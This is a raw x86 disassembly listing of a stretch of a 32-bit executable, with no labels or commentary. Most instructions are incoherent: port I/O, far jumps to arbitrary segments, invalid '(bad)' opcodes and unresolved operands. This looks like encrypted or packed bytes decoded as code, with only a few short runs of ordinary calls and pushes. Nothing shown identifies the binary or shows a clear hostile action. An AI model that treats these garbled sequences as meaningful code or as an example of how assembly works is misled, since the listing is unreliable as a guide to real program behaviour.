  406506:	mov    ah,cl
  406508:	fisttp QWORD PTR [ebp-0x300f826e]
  40650e:	adc    BYTE PTR [ecx-0x3901cca6],0x70
  406515:	and    ebx,DWORD PTR [edx-0x1e]
  406518:	jb     0x40651b
  40651a:	sbb    eax,0xca84a399
  40651f:	xor    al,0x10
  406521:	nop
  406522:	jl     0x406514
  406524:	cwde   
  406525:	dec    edi
  406526:	inc    edi
  406527:	sahf   
  406528:	lods   eax,DWORD PTR ds:[esi]
  406529:	test   al,0x9e
  40652b:	loop   0x40659f
  40652d:	or     eax,0xac740018
  406532:	out    dx,eax
  406533:	fcmovnb st,st(6)
  406535:	addr16 and eax,0x60b8ca7e
  40653b:	mov    WORD PTR [edi+eiz*8],?
  40653e:	jns    0x40651b
  406540:	xor    ax,0x3240
  406544:	jo     0x4065a8
  406546:	ret    0xaef4
  406549:	sar    DWORD PTR [ebx-0x7b4bbdb1],1
  40654f:	(bad)  
  406550:	adc    ch,al
  406552:	pop    esi
  406553:	pop    eax
  406554:	mov    al,0xd1
  406556:	outs   dx,BYTE PTR ds:[esi]
  406557:	sub    cl,BYTE PTR [eax+edx*1-0x362fc3d0]
  40655e:	adc    eax,0x5f00a06b
  406563:	or     cl,BYTE PTR [esi+0x11]
  406566:	popa   
  406567:	je     0x40654d
  406569:	call   0x405120
  40656e:	test   eax,eax
  406570:	je     0x40692c
  406576:	sbb    DWORD PTR ds:0x41075b,0x44899c
  406580:	lea    eax,[ebp-0x78]
  406583:	push   eax
  406584:	mov    eax,DWORD PTR [ebp-0x14]
  406587:	xor    eax,esi
  406589:	add    eax,edi
  40658b:	push   eax
  40658c:	mov    eax,DWORD PTR [ebp-0x10]
  40658f:	jmp    0x4066bb
  406594:	dec    edx
  406595:	add    bh,BYTE PTR [ebx]
  406597:	cmp    DWORD PTR [ebx-0x43],0x6a
  40659b:	fnsave [eax]
  40659d:	xchg   ebx,eax
  40659e:	mov    al,0xc5
  4065a0:	xchg   dh,cl
  4065a2:	jl     0x40653f
  4065a4:	push   0x24
  4065a6:	jl     0x406624
  4065a8:	or     eax,0xa47c7c7f
  4065ad:	(bad)  
  4065ae:	add    eax,0xfd881e19
  4065b3:	shl    DWORD PTR [ebx+0x67a2a65c],0xe8
  4065ba:	sub    DWORD PTR [eax+0x481fb942],esp
  4065c0:	(bad)  
  4065c1:	std    
  4065c2:	and    dh,bl
  4065c4:	idiv   DWORD PTR [edx]
  4065c6:	jmp    0x40658b
  4065c8:	retf   0x8f69
  4065cb:	jmp    0x5e3b:0xb665b544
  4065d2:	not    DWORD PTR [esi-0x6f8fa5f3]
  4065d8:	lds    edx,FWORD PTR [ebp-0x4adf0d4d]
  4065de:	int3   
  4065df:	or     al,0x3a
  4065e1:	scas   eax,DWORD PTR es:[edi]
  4065e2:	pushf  
  4065e3:	add    BYTE PTR [ecx],al
  4065e5:	test   eax,edi
  4065e7:	gs dec ebx
  4065e9:	mov    eax,0x8ba913c2
  4065ee:	mov    ds:0xdea27d8,eax
  4065f3:	imul   esp,DWORD PTR [esi],0x99b2f499
  4065f9:	out    0x9e,al
  4065fb:	jns    0x4065b6
  4065fd:	into   
  4065fe:	sbb    BYTE PTR [ecx-0x23],bh
  406601:	stc    
  406602:	into   
  406603:	push   ss
  406604:	lods   al,BYTE PTR ds:[esi]
  406605:	movntq QWORD PTR [eax],mm1
  406608:	xor    al,0x99
  40660a:	inc    eax
  40660b:	mov    ebp,0xa3eeadfd
  406610:	add    bh,BYTE PTR [edi+0x4c372893]
  406616:	into   
  406617:	leave  
  406618:	xchg   ecx,eax
  406619:	add    edi,0xffffffbc
  40661c:	dec    edx
  40661d:	pusha  
  40661e:	cdq    
  40661f:	add    al,0xd9
  406621:	xchg   esp,eax
  406622:	jcxz   0x4065f1
  406625:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406626:	xchg   BYTE PTR [ebx+0x1],ch
  406629:	cdq    
  40662a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40662b:	dec    eax
  40662c:	jns    0x40669a
  40662e:	jmp    0xbe6cf5d0
  406633:	jmp    0xa0eb:0xfe50c7e3
  40663a:	js     0x406618
  40663c:	cwde   
  40663d:	aas    
  40663e:	cmp    eax,0x573e9cfd
  406643:	add    eax,0x563edf5
  406648:	push   ecx
  406649:	jnp    0x4066c7
  40664b:	jp     0x4066a4
  40664d:	sbb    edx,DWORD PTR [edi+0x62a7ee73]
  406653:	test   BYTE PTR [ebx],0x39
  406656:	mov    eax,ds:0xf0d16168
  40665b:	cmp    al,0x24
  40665d:	fnstcw WORD PTR [eax+edx*2]
  406660:	and    esp,DWORD PTR [ecx+0x68]
  406663:	repz push ss
  406665:	or     eax,0x6cd00c45
  40666a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40666b:	retf   
  40666c:	or     BYTE PTR [edi+0xe],ah
  40666f:	ins    DWORD PTR es:[edi],dx
  406670:	mov    esi,0xb26cc5ec
  406675:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406676:	enter  0xb35d,0xb7
  40667a:	adc    DWORD PTR [ebp-0x5a],ebx
  40667d:	rol    BYTE PTR [esi-0x3d248d8f],cl
  406683:	add    bl,al
  406685:	in     eax,dx
  406686:	inc    ebx
  406687:	pop    ebx
  406688:	mov    ah,0xa3
  40668a:	in     al,0xff
  40668c:	mov    ebp,0x3f970f5d
  406691:	das    
  406692:	jmp    0xdc28:0x770dbcd7
  406699:	sub    al,cl
  40669b:	inc    esp
  40669c:	push   ecx
  40669d:	pop    ebx
  40669e:	loopne 0x406656
  4066a0:	pop    ss
  4066a1:	aam    0xae
  4066a3:	sti    
  4066a4:	ficomp DWORD PTR [edi]
  4066a6:	jmp    FWORD PTR [esi-0x5b6c2877]
  4066ac:	pop    ecx
  4066ad:	ins    BYTE PTR es:[edi],dx
  4066ae:	xor    bl,BYTE PTR [edx]
  4066b0:	mov    ecx,0x1332d2f6
  4066b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066b6:	add    edx,DWORD PTR [esi+0x5d27d46]
  4066bc:	stos   BYTE PTR es:[edi],al
  4066bd:	add    BYTE PTR [eax],al
  4066bf:	add    BYTE PTR [eax-0x17],dl
  4066c2:	daa    
  4066c3:	add    DWORD PTR [eax],eax
  4066c5:	add    BYTE PTR [ebx],ch
  4066c7:	dec    esp
  4066c8:	into   
  4066c9:	hlt    
  4066ca:	jge    0x4066c2
  4066cc:	jge    0x406731
  4066ce:	fnstenv [edi-0x32ffb590]
  4066d4:	inc    edi
  4066d5:	cld    
  4066d6:	jnp    0x4066ff
  4066d8:	jl     0x406756
  4066da:	or     eax,0x7c7c7f
  4066df:	repnz popf 
  4066e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066e2:	icebp  
  4066e3:	popf   
  4066e4:	mov    ch,0x29
  4066e6:	rol    DWORD PTR [edx+0x6b833791],0xda
  4066ed:	fwait
  4066ee:	xchg   edi,eax
  4066ef:	add    ecx,ebx
  4066f1:	retf   
  4066f2:	ins    BYTE PTR es:[edi],dx
  4066f3:	push   esi
  4066f4:	fsubr  DWORD PTR [ebp+0x5d4648ad]
  4066fa:	stc    
  4066fb:	inc    esp
  4066fc:	jge    0x406697
  4066fe:	(bad)  
  4066ff:	jb     0x40668e
  406701:	xor    cl,dl
  406703:	jb     0x4066d8
  406705:	test   BYTE PTR [esi+0x15e4eb4c],ch
  40670b:	fxch   st(0)
  40670d:	out    dx,eax
  40670e:	push   edx
  40670f:	sub    BYTE PTR cs:[ebx],0x4c
  406713:	test   BYTE PTR [edi+eax*2-0x72],cl
  406717:	in     al,dx
  406718:	js     0x40675a
  40671a:	ffreep st(1)
  40671c:	dec    BYTE PTR [eax]
  40671e:	(bad)  
  40671f:	and    BYTE PTR [ebx+0x1d],al
  406722:	call   0xc829ab01
  406727:	daa    
  406728:	dec    ebx
  406729:	rcl    BYTE PTR [ecx-0x5e],1
  40672c:	(bad)  
  40672d:	or     DWORD PTR [eax+0x29],esi
  406730:	out    dx,eax
  406731:	or     edx,DWORD PTR [ebp-0x5a95ab85]
  406737:	cmp    al,0x6c
  406739:	in     eax,dx
  40673a:	jns    0x406771
  40673c:	pushf  
  40673d:	retf   0x9160
  406740:	mov    edx,0x96dd4f02
  406745:	mov    bl,0x8b
  406747:	sub    ah,BYTE PTR [ecx+ecx*4+0x5838322c]
  40674e:	xchg   BYTE PTR [ebx+ecx*1+0x1203025a],dl
  406755:	mov    ecx,0xcee8f334
  40675a:	in     eax,dx
  40675b:	xchg   edi,eax
  40675c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40675d:	lahf   
  40675e:	pusha  
  40675f:	imul   ebx,DWORD PTR [ebp-0x57],0x74
  406763:	test   DWORD PTR [ecx+0x35],esp
  406766:	cmc    
  406767:	cmp    dl,al
  406769:	in     eax,dx
  40676a:	jb     0x406755
  40676c:	xor    esi,DWORD PTR [ebx]
  40676e:	mov    edi,0xe3bf01e8
  406773:	popf   
  406774:	ret    
  406775:	push   ebp
  406776:	mov    DWORD PTR [ebx],edx
  406778:	push   0x9
  40677a:	jmp    0x406760
  40677c:	call   0x4234:0xe7315e87
  406783:	aad    0x3d
  406785:	fimul  DWORD PTR [edx+0x7fb78e72]
  40678b:	pop    ebp
  40678c:	mov    eax,0xf715669e
  406791:	sbb    ebx,0xffffffb4
  406794:	jmp    0x406729
  406796:	dec    esp
  406797:	bound  eax,QWORD PTR [ecx+0x1c]
  40679a:	lods   al,BYTE PTR ds:[esi]
  40679b:	push   esi
  40679c:	stos   BYTE PTR es:[edi],al
  40679d:	outs   dx,BYTE PTR ds:[esi]
  40679e:	outs   dx,BYTE PTR ds:[esi]
  40679f:	jg     0x406820
  4067a1:	outs   dx,BYTE PTR ds:[esi]
  4067a2:	mov    ds:0xe458f45e,eax
  4067a7:	test   BYTE PTR [eax],bl
  4067a9:	mov    edi,0xa4520495
  4067ae:	sbb    edx,edi
  4067b0:	js     0x40677d
  4067b2:	ins    DWORD PTR es:[edi],dx
  4067b3:	mov    ecx,0x9f5278ba
  4067b8:	jae    0x406778
  4067ba:	dec    eax
  4067bb:	out    dx,al
  4067bc:	les    edi,FWORD PTR [esp+edx*1+0x4c]
  4067c0:	(bad)  
  4067c1:	scas   eax,DWORD PTR es:[edi]
  4067c2:	push   esp
  4067c3:	rcl    BYTE PTR [eax-0x7bd3ef65],1
  4067c9:	sub    esi,ecx
  4067cb:	jp     0x40684c
  4067cd:	mov    ah,0xce
  4067cf:	mov    bl,ch
  4067d1:	jg     0x406823
  4067d3:	in     eax,0x76
  4067d5:	(bad)  
  4067d6:	xchg   edx,eax
  4067d7:	xchg   edi,eax
  4067d8:	retf   
  4067d9:	xchg   esi,eax
  4067da:	shl    BYTE PTR [ebx-0x17ad34ef],1
  4067e0:	adc    ebx,DWORD PTR [esi]
  4067e2:	or     eax,0x12dcaccc
  4067e7:	mov    eax,0x87864be1
  4067ec:	iret   
  4067ed:	mov    eax,DWORD PTR [ebp-0x10]
  4067f0:	mov    eax,DWORD PTR [eax+0x198]
  4067f6:	jmp    0x406922
  4067fb:	shr    ecx,cl
  4067fd:	dec    esp
  4067fe:	pop    esi
  4067ff:	pop    edx
  406800:	jns    0x4067e7
  406802:	ins    DWORD PTR es:[edi],dx
  406803:	adc    eax,0x54a54fb4
  406808:	push   edi
  406809:	dec    edx
  40680a:	mov    esi,0x7c7c3908
  40680f:	or     eax,0x3e7c7c7f
  406814:	mov    esp,0xedd4ed9
  406819:	jnp    0x4067d9
  40681b:	fwait
  40681c:	sbb    DWORD PTR [ecx],ebp
  40681e:	sbb    al,0xb1
  406820:	xchg   edx,eax
  406821:	aaa    
  406822:	loope  0x40682d
  406824:	bound  eax,QWORD PTR [esi+0x53e0b8f7]
  40682a:	xchg   edx,eax
  40682b:	pop    edx
  40682c:	and    al,0x4f
  40682e:	(bad)  
  40682f:	fimul  WORD PTR [ebx]
  406831:	(bad)  
  406832:	and    al,0x4
  406834:	test   BYTE PTR [eax],bl
  406836:	mov    ah,0xda
  406838:	repz xchg ebp,eax
  40683a:	cli    
  40683b:	neg    BYTE PTR [ebx]
  40683d:	mov    eax,ds:0x455b62ee
  406842:	xchg   esp,eax
  406843:	or     eax,0x555e1497
  406848:	xor    cl,BYTE PTR [ebp-0x5453c5dd]
  40684e:	inc    esp
  40684f:	mov    dl,0x92
  406851:	js     0x406852
  406853:	and    eax,0x84453b8c
  406858:	xor    DWORD PTR [edi+0x62],edx
  40685b:	dec    edx
  40685c:	cmp    al,0xf9
  40685e:	stos   BYTE PTR es:[edi],al
  40685f:	fisttp DWORD PTR [ecx]
  406861:	sbb    BYTE PTR [edx-0x53d09016],0x7d
  406868:	out    0xe8,al
  40686a:	stos   DWORD PTR es:[edi],eax
  40686b:	out    0x73,al
  40686d:	mov    ebx,0x7bb9f68d
  406872:	sbb    DWORD PTR [ecx+0x1a58fda7],edx
  406878:	jmp    0x406853
  40687a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40687b:	sub    al,0xa
  40687d:	dec    ecx
  40687e:	out    dx,al
  40687f:	xchg   esp,eax
  406880:	xchg   ebp,eax
  406882:	add    dl,al
  406884:	dec    edx
  406885:	int    0x8
  406887:	ins    BYTE PTR es:[edi],dx
  406888:	xchg   cl,cl
  40688a:	pushf  
  40688b:	outs   dx,BYTE PTR ds:[esi]
  40688c:	xor    edi,edi
  40688e:	sub    bh,BYTE PTR [ecx-0x346520e2]
  406894:	jnp    0x4068f9
  406896:	mov    DWORD PTR gs:[ebp-0x80],ecx
  40689a:	mov    ch,0x40
  40689c:	cmp    BYTE PTR [eax-0x9],dl
  40689f:	pushf  
  4068a0:	sbb    eax,0xe3c4fff0
  4068a5:	call   0x9504:0xed0eb50b
  4068ac:	adc    bl,ch
  4068ae:	icebp  
  4068af:	cmp    al,0xab
  4068b1:	out    dx,eax
  4068b2:	xchg   edx,eax
  4068b3:	inc    edx
  4068b4:	sub    eax,0x877e0ea
  4068b9:	sub    eax,DWORD PTR [ebp+0x76588806]
  4068bf:	dec    esi
  4068c0:	sub    al,0x54
  4068c2:	int    0xf5
  4068c4:	sub    DWORD PTR [ecx],esi
  4068c6:	lock jg 0x40685a
  4068c9:	or     dh,BYTE PTR [ebx]
  4068cb:	dec    DWORD PTR [edi+eax*2+0x63e4c98c]
  4068d2:	cmp    ch,cl
  4068d4:	inc    esp
  4068d5:	sbb    BYTE PTR [eax],0x77
  4068d8:	mov    edx,0xe31693e
  4068dd:	repnz mov WORD PTR [ebp-0x2f],fs
  4068e1:	xor    al,0x6c
  4068e3:	aad    0xf
  4068e5:	sub    bh,BYTE PTR [esi+0x6c]
  4068e8:	cmp    eax,0x7f3833af
  4068ed:	lock push ds
  4068ef:	sbb    eax,esp
  4068f1:	js     0x40688e
  4068f3:	out    dx,al
  4068f4:	fisubr WORD PTR [ebx+0x527efc26]
  4068fa:	pop    ebx
  4068fb:	fucom  st(2)
  4068fd:	mov    dh,0x84
  4068ff:	inc    edi
  406900:	push   cs
  406901:	neg    DWORD PTR [esp+eiz*4-0x3e]
  406905:	je     0x40696b
  406907:	sub    BYTE PTR [esi+0xd8898b9],0xd7
  40690e:	js     0x4068a5
  406910:	hlt    
  406911:	mov    ebp,0xb41bba05
  406916:	mov    dh,0x35
  406918:	les    ebx,FWORD PTR [esi]
  40691a:	mov    bh,BYTE PTR [ebx+eax*4]
  40691d:	inc    ebp
  40691e:	test   eax,0xff0a0f59
  406923:	xor    al,ch
  406925:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406927:	(bad)  
  406928:	dec    DWORD PTR [ecx+0x7d83f845]
  40692e:	clc    
  40692f:	add    BYTE PTR [ebp+0x45890445],cl
  406935:	loopne 0x406946
  406937:	test   BYTE PTR [edx-0x72fffffa],bl
  40693d:	inc    ebp
  40693e:	call   0xd485f493
  406943:	xor    eax,esi
  406945:	add    eax,edi
  406947:	push   eax
  406948:	mov    eax,DWORD PTR [ebp-0x1c]
  40694b:	xor    eax,esi
  40694d:	add    eax,edi
  40694f:	push   eax
  406950:	push   DWORD PTR [ebp-0x8]
  406953:	lea    eax,[ebp-0x78]
  406956:	push   eax
  406957:	push   DWORD PTR [ebp-0xc]
  40695a:	push   DWORD PTR [ebp-0x14]
  40695d:	call   0x4055ae
  406962:	test   eax,eax
  406964:	je     0x406abb
  40696a:	lea    eax,[ebp-0x78]
  40696d:	push   eax
  40696e:	mov    eax,DWORD PTR [ebp-0x14]
  406971:	xor    eax,esi
  406973:	add    eax,edi
  406975:	push   eax
  406976:	mov    eax,DWORD PTR [ebp-0x10]
  406979:	add    eax,0xee
  40697e:	push   eax
  40697f:	mov    eax,DWORD PTR [ebp-0x10]
  406982:	mov    eax,DWORD PTR [eax+0x198]
  406988:	push   DWORD PTR [eax]
  40698a:	jmp    0x406ab6
  40698f:	xor    BYTE PTR [ecx-0x12922c70],ch
  406995:	mov    bl,0xa9
  406997:	and    BYTE PTR [esi+eax*2-0x22],ch
  40699b:	sub    BYTE PTR [edx+edi*1],al
  40699e:	push   esi
  40699f:	sbb    DWORD PTR [eax],edi
  4069a1:	jl     0x406a1f
  4069a3:	or     eax,0xca7c7c7f
  4069a8:	or     ecx,ebx
  4069aa:	push   cs
  4069ab:	mov    ch,0x32
  4069ae:	lea    edi,[esi]
  4069b0:	add    BYTE PTR [edx+0x55e4ffef],bl
  4069b6:	rcr    DWORD PTR [ebp-0x75],0x6e
  4069ba:	fistp  DWORD PTR [edx]
  4069bc:	ss and al,0x4e
  4069bf:	sub    eax,0x8686a09e
  4069c4:	push   0xf74fa56
  4069c9:	imul   DWORD PTR [ebx]
  4069cb:	aaa    
  4069cc:	inc    esp
  4069cd:	imul   ebx,DWORD PTR [ecx-0xf],0xc9e6e445
  4069d4:	push   ds
  4069d5:	pop    edx
  4069d6:	inc    esp
  4069d7:	dec    ebp
  4069d8:	cmp    al,BYTE PTR [ebp+0x7181fd1]
  4069de:	sbb    eax,0xf8775d90
  4069e3:	idiv   ebp
  4069e5:	(bad)
  4069e8:	jb     0x406970
  4069ea:	and    al,0x37
  4069ec:	rcr    DWORD PTR [esi+0x40],cl
  4069ef:	jae    0x406a3e
  4069f1:	xchg   edi,eax
  4069f2:	adc    BYTE PTR [edx],ch
  4069f4:	jbe    0x40699b
  4069f6:	inc    ebp
  4069f7:	jb     0x406a42
  4069f9:	pop    ecx
  4069fa:	mov    eax,0x4985394c
  4069ff:	out    dx,al
  406a00:	cmp    edi,ebx
  406a02:	jnp    0x4069ec
  406a04:	sub    ch,BYTE PTR ds:0x6d811bd
  406a0a:	or     cl,BYTE PTR [ebp+0x76]
  406a0d:	or     al,0x16
  406a0f:	add    BYTE PTR [edi-0x37c246b3],bh
  406a15:	mov    ch,BYTE PTR [ecx]
  406a17:	xchg   DWORD PTR [ebx+0xb8686c3],ebp
  406a1d:	add    ebp,0x1062234f
  406a23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a24:	dec    eax
  406a25:	lahf   
  406a26:	cmp    eax,0x963135e2
  406a2b:	add    al,0x84
  406a2d:	jo     0x406a38
  406a2f:	xor    ebx,DWORD PTR ds:0x13a3c15a
  406a35:	(bad)  
  406a36:	idiv   DWORD PTR [ebx-0x61]
  406a39:	add    eax,0xe60b8f1a
  406a3e:	mov    bl,0xa5
  406a40:	lds    esi,FWORD PTR ds:0xc53c27c2
  406a46:	pop    ebx
  406a47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a48:	aam    0xf8
  406a4a:	test   DWORD PTR [esi-0x3f21a628],ebp
  406a50:	(bad)  
  406a51:	lock shl DWORD PTR [edx],cl
  406a54:	popf   
  406a55:	(bad)
  406a58:	mov    edi,0xfc4772d3
  406a5d:	and    esp,edx
  406a5f:	push   eax
  406a60:	sar    DWORD PTR [ecx-0x55],0xa3
  406a64:	sub    eax,DWORD PTR ds:0x734d136a
  406a6a:	dec    ebx
  406a6b:	xor    bh,ch
  406a6d:	xor    BYTE PTR [ebx],dh
  406a6f:	scas   eax,DWORD PTR es:[edi]
  406a70:	ja     0x406ae9
  406a72:	jno    0x406a00
  406a74:	sbb    BYTE PTR [edi+0x37d37c7],0xdf
  406a7b:	call   0xa699fab1
  406a80:	cmp    eax,0x96b71b16
  406a85:	and    eax,0xd3b1572b
  406a8a:	and    eax,0xcbcc667
  406a8f:	(bad)  
  406a90:	push   esp
  406a91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a92:	mov    esp,0x76ad44f3
  406a97:	inc    eax
  406a98:	adc    cl,BYTE PTR [ecx+eiz*4+0x442c1089]
  406a9f:	mov    ch,0x22
  406aa1:	xor    al,0xcc
  406aa3:	jo     0x406a83
  406aa5:	test   BYTE PTR [esi],cl
  406aa7:	jmp    0x406afc
  406aa9:	lock popa 
  406aab:	ret    
  406aac:	and    eax,DWORD PTR [ecx-0xf]
  406aaf:	loope  0x406ab7
  406ab1:	aad    0xe2
  406ab3:	test   eax,0x61e84382
  406ab8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ab9:	(bad)  
  406aba:	dec    DWORD PTR [ebx-0x31cc1bb3]
  406ac0:	mov    eax,0xffcd8d62
  406ac5:	sub    eax,ecx
  406ac7:	jmp    0x406bf3
  406acc:	or     al,0x53
  406ace:	and    al,0x43
  406ad0:	jnp    0x406b2d
  406ad2:	jnp    0x406b27
  406ad4:	gs ins DWORD PTR es:[edi],dx
  406ad6:	push   esp
  406ad7:	and    BYTE PTR ds:0x168962fd,al
  406add:	cmp    edi,DWORD PTR [esp+edi*2+0xd]
  406ae1:	jg     0x406b5f
  406ae3:	jl     0x406a7c
  406ae5:	pop    ss
  406ae6:	lea    esi,[edx]
  406ae8:	mov    eax,ds:0x8c68b707
  406aed:	jmp    0x7329:0x8dedbe07
  406af4:	in     al,dx
  406af5:	inc    edi
  406af6:	lea    ebx,[ecx]
  406af8:	sub    cl,BYTE PTR [esp+ebp*4]
  406afb:	test   al,cl
  406afd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406afe:	sti    
  406aff:	mov    ss,WORD PTR fs:[edx+ebp*4-0x3f9ea2d5]
  406b07:	(bad)  
  406b08:	xor    ecx,DWORD PTR ds:[esp+esi*4]
  406b0c:	les    edi,FWORD PTR [edx-0x3b96e9ae]
  406b12:	push   esp
  406b13:	xchg   esp,eax
  406b14:	sbb    BYTE PTR [ebx+0x1d],bl
  406b17:	inc    edi
  406b18:	add    ah,ah
  406b1a:	(bad)  
  406b1b:	mov    esi,0x865fc73a
  406b20:	fbld   TBYTE PTR [edx+0x78]
  406b23:	mov    al,0x5a
  406b25:	jo     0x406b5b
  406b27:	dec    ebp
  406b28:	rcr    DWORD PTR [ebx-0x555ed10f],cl
  406b2e:	fisub  DWORD PTR [esi]
  406b30:	add    DWORD PTR [esi-0xb],edx
  406b33:	add    dl,BYTE PTR [eax+0xb]
  406b36:	mov    esp,0x46a94333
  406b3b:	inc    ecx
  406b3c:	scas   eax,DWORD PTR es:[edi]
  406b3d:	mov    ah,0x54
  406b3f:	shl    ch,0x2e
  406b42:	xlat   BYTE PTR ds:[ebx]
  406b43:	jle    0x406b9a
  406b45:	out    0xed,eax
  406b47:	and    BYTE PTR [ebx],cl
  406b49:	xor    al,0xd9
  406b4b:	pop    edx
  406b4c:	cmp    eax,0x44c1ed4
  406b51:	pop    edx
  406b52:	cld    
  406b53:	fdiv   DWORD PTR [edx-0x64]
  406b56:	ja     0x406b53
  406b58:	mov    ds:0xeefba633,al
  406b5d:	mov    cl,0xef
  406b5f:	dec    eax
  406b60:	add    ah,ch
  406b62:	xor    DWORD PTR [edx],eax
  406b64:	retf   
  406b65:	jecxz  0x406bc2
  406b67:	adc    ecx,DWORD PTR [ecx]
  406b69:	nop
  406b6a:	add    DWORD PTR [ebp-0x2e80a5f],ebx
  406b70:	repz push 0xf1941e67
  406b76:	lea    ecx,[esi-0x469067bc]
  406b7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b7d:	sbb    al,0x41
  406b7f:	push   ds
  406b80:	jge    0x406b97
  406b82:	add    ch,dh
  406b84:	inc    edx
  406b85:	adc    DWORD PTR [ecx],esp
  406b87:	cmp    esi,DWORD PTR [eax-0x3b]
  406b8a:	das    
  406b8b:	add    eax,0xa66b97e7
  406b90:	bound  esi,QWORD PTR [esi+eax*8]
  406b93:	dec    ebx
  406b94:	add    esi,ebx
  406b96:	cli    
  406b97:	sub    edi,DWORD PTR [ebp+edi*8+0x77246258]
  406b9e:	ror    ah,cl
  406ba0:	fisttp QWORD PTR [esi+ebx*8-0x7a]
  406ba4:	shl    BYTE PTR [edx-0x14701eec],0x99
  406bab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bac:	into   
  406bad:	sbb    bh,BYTE PTR [edi+edi*4]
  406bb0:	dec    esi
  406bb1:	fwait
  406bb2:	xchg   edi,eax
  406bb3:	push   edi
  406bb5:	xor    BYTE PTR [edi+0x64],ch
  406bb8:	mov    ebx,ecx
  406bba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bbb:	fisub  WORD PTR [edx]
  406bbd:	cli    
  406bbe:	or     al,0xf1
  406bc0:	jle    0x406c23
  406bc2:	dec    edi
  406bc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bc4:	shr    DWORD PTR [ebx-0x2b],1
  406bc7:	dec    ebx
  406bc8:	pushf  
  406bc9:	push   ss
  406bca:	arpl   WORD PTR [ebx],ax
  406bcc:	popa   
  406bcd:	add    DWORD PTR [esi-0x52],esp
  406bd0:	and    BYTE PTR [edx+eiz*1-0x55],dl
  406bd4:	push   cs
  406bd5:	jmp    0x9a1b21e3
  406bda:	out    dx,eax
  406bdb:	jns    0x406bac
  406bdd:	stos   BYTE PTR es:[edi],al
  406bde:	add    DWORD PTR [edi-0xe],ebx
  406be1:	xor    BYTE PTR [ecx-0x17270766],al
  406be7:	jge    0x406b98
  406be9:	pop    ecx
  406bea:	(bad)  
  406beb:	data16 fwait
  406bed:	and    BYTE PTR [edi+0x5c],bl
  406bf0:	add    al,0x98
  406bf2:	shr    DWORD PTR [ebx],cl
  406bf4:	inc    ebp
  406bf5:	clc    
  406bf6:	mov    ecx,DWORD PTR [ebp-0x30]
  406bf9:	add    ecx,eax
  406bfb:	jmp    0x406d27
  406c00:	xchg   ebp,eax
  406c01:	(bad)  
  406c02:	out    0x14,eax
  406c04:	std    
  406c05:	push   esp
  406c06:	gs popf 
  406c08:	repz mov al,ds:0x60b69e75
  406c0e:	mov    cl,0x19
  406c10:	daa    
  406c11:	cmp    bh,BYTE PTR [esp+edi*2+0xd]
  406c15:	jg     0x406c93
  406c17:	jl     0x406c31
  406c19:	jmp    DWORD PTR [ecx+0x331c4c29]
  406c1f:	add    al,0xd
  406c21:	inc    esi
  406c22:	(bad)  
  406c23:	in     al,dx
  406c24:	call   0x1b5a:0xef8ab82f
  406c2b:	mov    ebp,0x67c55688
  406c30:	cmp    bl,dh
  406c32:	dec    esi
  406c33:	jmp    0xb70c7770
  406c38:	mov    ds:0xa98362ce,al
  406c3d:	pop    edi
  406c3e:	ins    DWORD PTR es:[edi],dx
  406c3f:	sub    BYTE PTR [esi-0x69],0xc6
  406c43:	lea    edi,[esi+0x27]
  406c46:	ret    0xc723
  406c49:	in     eax,0xf6
  406c4b:	outs   dx,DWORD PTR ds:[esi]
  406c4c:	inc    edx
  406c4d:	xor    al,bl
  406c4f:	xor    esi,DWORD PTR [esi]
  406c51:	push   ebp
  406c52:	hlt    
  406c53:	sbb    BYTE PTR [eax+0x270fc559],0xf2
  406c5a:	push   ss
  406c5b:	adc    al,0x69
  406c5d:	dec    DWORD PTR [edi+0x6c297bc1]
  406c63:	iret   
  406c64:	mov    ds:0x30e3eac1,al
  406c69:	call   0xb4fb:0x25d833dd
  406c70:	std    
  406c71:	sub    al,0x4b
  406c73:	inc    eax
  406c74:	push   0xd251c311
  406c79:	sub    dl,dl
  406c7b:	in     eax,0x7d
  406c7d:	push   ebx
  406c7e:	dec    edi
  406c7f:	cli    
  406c80:	test   DWORD PTR [ebp+0x58],ebp
  406c83:	daa    
  406c84:	inc    ebx
  406c85:	icebp  
  406c86:	addr16 ds das 
  406c89:	repnz repnz (bad) 
  406c8c:	sti    
  406c8d:	stos   BYTE PTR es:[edi],al
  406c8e:	daa    
  406c8f:	into   
  406c90:	add    DWORD PTR [ebx-0x31],esp
  406c93:	mov    dl,0x1c
  406c95:	aas    
  406c96:	jp     0x406c97
  406c98:	jne    0x406c4c
  406c9a:	xor    ebp,DWORD PTR [edx+ebp*2-0xf]
  406c9e:	jae    0x406c59
  406ca0:	sbb    eax,0x811edcc5
  406ca5:	pop    edi
  406ca6:	xchg   ebx,eax
  406ca7:	xchg   ecx,eax
  406ca8:	mov    edi,0x64dfae3f
  406cad:	imul   esp,DWORD PTR [esi],0x3a43a14c
  406cb3:	loope  0x406cf0
  406cb5:	stc    
  406cb6:	push   0x15
  406cb8:	pop    esp
  406cb9:	cmp    al,0xb9
  406cbb:	mov    ?,WORD PTR ds:[edi+0x76126e12]
  406cc2:	cmp    al,0xb7
  406cc4:	jle    0x406c8c
  406cc6:	mov    ch,BYTE PTR [ebp-0x3c]
  406cc9:	test   al,0x69
  406ccb:	in     al,dx
  406ccc:	les    eax,FWORD PTR [edi]
  406cce:	or     ecx,DWORD PTR [edx]
  406cd0:	xchg   BYTE PTR [esi+eax*4+0x59],bl
  406cd4:	fild   WORD PTR [edi]
  406cd6:	out    dx,al
  406cd7:	es jno 0x406c73
  406cda:	mov    BYTE PTR [ecx+0x25],al
